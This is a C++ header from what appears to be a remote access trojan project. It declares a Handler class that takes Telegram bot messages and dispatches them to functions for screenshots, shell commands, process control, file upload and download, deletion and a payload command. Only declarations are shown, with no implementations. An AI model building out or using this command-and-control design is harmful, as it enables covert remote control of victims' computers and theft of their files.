/*include/rat/Handler.hpp*/
#pragma once
#include "rat/handler/types.hpp"
#include "rat/tbot/tbot.hpp"
#include "rat/tbot/types.hpp"
#include "rat/networking.hpp"

#include <string>
#include <array>
#include <vector>
#include <cstdint>


namespace rat::handler {

class Handler {
private:

    //the handler refrences the bot instead of owning it, they bot live inside the scope of the void botLoop(void) functions;
    tbot::Bot& bot;
    tbot::BaseBot& backing_bot;
    
    RatState state;
    rat::networking::Client curl_client;

    rat::tbot::Update telegram_update;
    Command command;

    struct CommandHandler {
        std::string command;
        void (Handler::*handler)();
    };
    
    const std::array<CommandHandler, 18> command_map = {{
        {"/screenshot",   &Handler::handleScreenshotCommand},
        {"/sh",           &Handler::parseAndHandleShellCommand},
        {"/process",      &Handler::parseAndHandleProcessCommand},
        {"/menu",         &Handler::handleMenuCommand},
        {"/download",     &Handler::handleDownloadCommand},
        {"/upload",       &Handler::handleUploadCommand},
        {"/pwd",          &Handler::handlePwdCommand},
        {"/cd",           &Handler::handleCdCommand},
        {"/ls",           &Handler::handleLsCommand},
        {"/read",         &Handler::handleReadCommand},
        {"/touch",        &Handler::handleTouchCommand},
        {"/get",          &Handler::handleGetCommand},
        {"/stat",         &Handler::handleStatCommand},
        {"/rm",           &Handler::handleRmCommand},
        {"/mv",           &Handler::handleMvCommand},
        {"/cp",           &Handler::handleCpCommand},
        {"/set",          &Handler::handleSetCommand},
        {"/help",         &Handler::handleHelpCommand}
    }};
    

  // Parse Telegram message to command
    void parseTelegramMessageToCommand(void);
    
  // Command handler methods
    void handleScreenshotCommand();
    void parseAndHandleShellCommand();
    void parseAndHandleProcessCommand();
    void handleHelpCommand();
    void handleMenuCommand();
    void handleMessageWithUploadedFiles();
    void handleDownloadCommand();
    void handleUploadCommand();
    void handlePwdCommand();
    void handleCdCommand();
    void handleLsCommand();
    void handleReadCommand();
    void handleTouchCommand();
    void handleGetCommand();
    void handleStatCommand();
    void handleRmCommand();
    void handleMvCommand();
    void handleCpCommand();
    void handleSetCommand();

    // Dispatchers - direct member function calls
    void dispatchIntegratedCommand();

    void dispatchDynamicCommand();

    void handlePayloadCommand(void);
    
public:
    Handler(rat::tbot::Bot& arg_Bot, rat::tbot::BaseBot& Backing_Bot):
        bot(arg_Bot),
        backing_bot(Backing_Bot),
        state(),
        curl_client(),
        telegram_update(),
        command()
        {} 
    // Handle Telegram update
    void handleUpdate(rat::tbot::Update&& arg_Update);
     
};//class rat::handler::Handler

void   __normalizeWhiteSpaces(std::string& String_Input);
size_t __countWhiteSpaces(const std::string& String_Input);
size_t  __findFirstOccurenceOfChar(const std::string& Input_String, char arg_C);
uint16_t _stringToUint16(const std::string& str);
std::vector<std::string> splitArguments(const std::string& Input_String);
std::string stripQuotes(const std::string& Input_String);

} // namespace rat::handler


